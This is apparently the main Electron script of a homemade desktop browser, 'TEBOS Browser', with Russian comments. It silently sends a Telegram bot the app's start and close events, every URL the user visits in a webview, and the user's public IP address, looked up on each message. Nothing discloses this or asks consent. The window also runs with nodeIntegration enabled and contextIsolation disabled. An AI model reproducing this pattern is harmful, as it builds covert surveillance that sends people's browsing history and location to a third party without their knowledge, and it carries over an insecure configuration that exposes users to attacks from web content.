const { app, BrowserWindow } = require('electron');
const axios = require('axios');

// --- НАСТРОЙКИ ТЕЛЕГРАМА ---
const TG_TOKEN = "-";
const TG_CHAT_ID = "-";

async function sendTelegram(message) {
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: TG_CHAT_ID,
            text: `[TEBOS LOG]: ${message}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error("Ошибка отправки в TG:", error.message);
    }
}

function createWindow() {
    const win = new BrowserWindow({
        width: 1280,
        height: 720,
        title: "TEBOS Browser",
        backgroundColor: '#1a1a1a',
        webPreferences: {
            webviewTag: true,
            nodeIntegration: true,
            contextIsolation: false,
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 TEBOS/1.0.0"
        }
    });

    win.loadFile('index.html');
    win.setMenu(null);

    // Уведомление об открытии
    sendTelegram("🚀 Браузер запущен!");

    // Отслеживание переходов по сайтам через webview
    // Это будет работать, когда ты меняешь URL во вкладках
    app.on('web-contents-created', (event, contents) => {
        if (contents.getType() === 'webview') {
            contents.on('did-navigate', (event, url) => {
                if (!url.includes('home.html')) {
                    sendTelegram(`🌐 Переход на сайт: ${url}`);
                }
            });
        }
    });
}

app.whenReady().then(createWindow);

// Уведомление о закрытии,временно не работает)
app.on('will-quit', async (event) => {
    // Важно: уведомление при закрытии может не успеть уйти, 
    // если не подождать завершения запроса
    await sendTelegram("🛑 Браузер закрыт.");
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') app.quit();
});
// Функция для получения IP-адреса
async function getIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        return "Не удалось определить IP";
    }
}

// Обновленная функция отправки (теперь с IP)
async function sendTelegram(message) {
    const ip = await getIP(); // Получаем IP каждый раз при отправке важного лога
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
    
    // Формируем красивый текст
    const fullMessage = `
<b>[TEBOS LOG]</b>
<b>Событие:</b> ${message}
<b>IP-адрес:</b> <code>${ip}</code>
    `;

    try {
        await axios.post(url, {
            chat_id: TG_CHAT_ID,
            text: fullMessage,
            parse_mode: "HTML"
        });
    } catch (error) {
        console.error("Ошибка TG:", error.message);
    }

}
